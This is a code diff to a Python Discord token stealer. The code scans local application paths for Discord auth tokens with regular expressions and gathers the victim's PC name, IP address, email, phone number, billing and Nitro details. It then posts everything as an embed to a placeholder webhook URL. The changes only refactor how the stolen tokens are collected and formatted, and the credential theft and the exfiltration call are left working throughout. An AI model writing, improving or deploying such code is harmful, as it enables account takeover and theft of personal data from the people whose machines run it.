@@ -37,6 +37,7 @@ def getToken(path):
             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                 for token in findall(regex, line):
                     tokens.append(token)
+                    
     return tokens 
 
 
@@ -75,12 +76,13 @@ def main():
     pcName = os.getenv("COMPUTERNAME")
     ip = getip()
     token = ''
-    alltoken = ''
+    alltoken = []
     avatar = ''
     email = ''
     nitro = ''
     billing = ''
     phoneNumber = ''
+    result = ""
     for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
@@ -90,11 +92,12 @@ def main():
         if len(tokens) > 0:
             for a in tokens:
                 token += f'{a}\n'
-                alltoken = token
+    
         else:
             token += 'Not found'
         
         for token in getToken(path):
+            alltoken.append(token)
             user_info = getuserdata(token)
             if not user_info:
                 continue
@@ -106,7 +109,9 @@ def main():
             phoneNumber = user_info.get("Phone")
             user_id = user_info["id"]
             avatar_id = user_info["avatar"]
-            avatar = getavatar(user_id, avatar_id)       
+            avatar = getavatar(user_id, avatar_id)
+    for k in alltoken:
+        result += k + " 👨‍💻 " + "\n"
     embed = {
                 "color": 0x000000,
                 "fields": [
@@ -127,7 +132,7 @@ def main():
                     },
                     {
                         "name": "**All Token**",
-                        "value": f'{alltoken}\n',
+                        "value": f'{result}',
                         "inline": False
                     }
                 ],
@@ -151,7 +156,7 @@ def main():
     }
 
     try:
-        urlopen(Request("URL WEBHOOK HERE", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("WEBHOOK URL HERE", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
 try:
